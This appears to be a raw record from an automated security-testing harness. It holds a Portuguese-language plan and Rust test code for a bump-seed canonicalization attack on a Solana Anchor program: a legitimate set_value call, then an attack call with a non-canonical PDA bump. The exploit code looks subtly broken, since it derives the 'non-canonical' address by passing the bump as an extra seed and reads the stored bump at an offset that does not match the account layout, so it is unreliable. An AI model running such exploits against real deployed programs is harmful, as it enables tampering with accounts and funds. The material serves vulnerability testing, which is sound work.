attempts.raw:
{
  "plan": "Preparamos uma conta DataAccount existente no PDA canonico derivado de [b"data", user, bump_canonico] e um usuario signer. O baseline chama set_value com o bump canonico e um valor legitimo, provando que o cenario esta correto. O ataque chama set_value com um bump nao canonico (bump_canonico - 1) para o mesmo usuario, tentando fazer o programa aceitar um endereco diferente do PDA canonico. O efeito medido e que a conta resultante tem endereco diferente do PDA canonico (ou seja, o ataque foi aceito), lendo o bump armazenado e comparando com o bump canonico.",
  "scenario": "let user = Pubkey::new_unique();
let (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[b"data", user.as_ref()], &env.program_id);
let non_canonical_bump = canonical_bump.wrapping_sub(1);
let (non_canonical_pda, _) = Pubkey::find_program_address(&[b"data", user.as_ref(), &[non_canonical_bump]], &env.program_id);

let data_account = account(
    &env.program_id,
    &anchor_account_data("DataAccount", &(user, 0u64, canonical_bump)),
    None,
);
let user_account = wallet(1_000_000_000);

let metas = vec![
    AccountMeta::new(canonical_pda, false),
    AccountMeta::new_readonly(user, true),
];
let baseline_ix = env.anchor_ix("set_value", &(canonical_bump, 42u64), metas.clone());
let baseline_accounts = vec![
    (canonical_pda, data_account.clone()),
    (user, user_account.clone()),
];
let baseline_result = env.baseline("set_value legitimo com bump canonico", &baseline_ix, &baseline_accounts);

let attack_metas = vec![
    AccountMeta::new(non_canonical_pda, false),
    AccountMeta::new_readonly(user, true),
];
let attack_ix = env.anchor_ix("set_value", &(non_canonical_bump, 99u64), attack_metas);
let attack_accounts = vec![
    (non_canonical_pda, data_account),
    (user, user_account),
];
let attack_result = env.attack("set_value com bump nao canonico", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let stored_bump = after(&attack_result, &non_canonical_pda).data()[40 + 32 + 8];
    env.effect(
        "conta aceita com endereco diferente do PDA canonico (bump nao canonico)",
        non_canonical_pda != canonical_pda && stored_bump == non_canonical_bump,
    );
}"
}

